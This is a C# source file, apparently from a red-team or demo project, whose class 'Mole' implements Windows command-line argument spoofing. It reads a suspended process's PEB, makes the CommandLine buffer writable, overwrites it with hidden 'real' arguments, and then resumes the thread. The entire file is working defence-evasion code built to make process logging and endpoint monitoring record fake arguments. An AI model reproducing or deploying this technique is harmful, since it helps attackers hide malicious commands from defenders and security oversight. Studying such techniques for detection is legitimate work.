using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using static DemoApp.Sacrificial.Lamb;

namespace DemoApp.Deception
{
    public class Mole
    {
        PROCESS_INFORMATION pi;
        string RealArgs;

        public Mole(PROCESS_INFORMATION pi, string RealArgs)
        {
            this.pi = pi;
            this.RealArgs = RealArgs;
        }

        public void SpoofArgs()
        {
            var pbi = GetPBI();

            // x64 only
            var rtlUserProcessParameters = 0x20;
            var commandLine = 0x70;
            var readSize = 0x8;

            Thread.Sleep(500);

            var pProcessParams = ReadRemoteMemory(pbi.PebBaseAddress + rtlUserProcessParameters, readSize);
            var processParams = Marshal.ReadInt64(pProcessParams);
            var cmdLineUnicodeStruct = new IntPtr(processParams + commandLine);

            var currentCmdLineStruct = new UNICODE_STRING();
            var uniStructSize = Marshal.SizeOf(currentCmdLineStruct);

            var pCmdLineStruct = ReadRemoteMemory(cmdLineUnicodeStruct, uniStructSize);
            currentCmdLineStruct = (UNICODE_STRING)Marshal.PtrToStructure(pCmdLineStruct, typeof(UNICODE_STRING));

            WriteRemoteMemory(currentCmdLineStruct.Buffer, currentCmdLineStruct.Length);

            Thread.Sleep(500);

            ResumeThread(pi.hThread);
        }

        private PROCESS_BASIC_INFORMATION GetPBI()
        {
            var pbi = new PROCESS_BASIC_INFORMATION();
            int pbiSize = Marshal.SizeOf(pbi);
            NtQueryInformationProcess(pi.hProcess, 0, ref pbi, pbiSize, out uint _);
            return pbi;
        }

        private IntPtr ReadRemoteMemory(IntPtr pMem, int size)
        {
            // Alloc & null buffer
            var pMemLoc = Marshal.AllocHGlobal(size);
            RtlZeroMemory(pMemLoc, size);

            // Read
            ReadProcessMemory(pi.hProcess, pMem, pMemLoc, (uint)size, out uint _);

            return pMemLoc;
        }

        public void WriteRemoteMemory(IntPtr pDest, int size)
        {
            // Make writable
            VirtualProtectEx(pi.hProcess, pDest, (uint)size, AllocationProtect.PAGE_READWRITE, out AllocationProtect old);

            var pMem = Marshal.AllocHGlobal(size);

            // Erase current buffer
            RtlZeroMemory(pMem, size);
            WriteProcessMemory(pi.hProcess, pDest, pMem, (uint)size, out uint _);

            // Write new args
            var newArgs = Encoding.Unicode.GetBytes(RealArgs);
            Marshal.Copy(newArgs, 0, pMem, newArgs.Length);
            WriteProcessMemory(pi.hProcess, pDest, pMem, (uint)size, out uint _);

            // Restore memory perms
            VirtualProtectEx(pi.hProcess, pDest, (uint)size, old, out AllocationProtect _);
        }

        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [Flags]
        enum AllocationProtect : uint
        {
            NONE = 0x00000000,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(
            IntPtr hThread
            );

        [DllImport("kernel32.dll")]
        static extern void RtlZeroMemory(
            IntPtr pBuffer,
            int length
            );

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            uint dwSize,
            out uint lpNumberOfBytesRead
            );

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationProtect flNewProtect,
            out AllocationProtect lpflOldProtect
            );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            IntPtr lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten
            );

        [DllImport("ntdll.dll")]
        static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            uint processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            int processInformationLength,
            out uint returnLength
            );
    }
}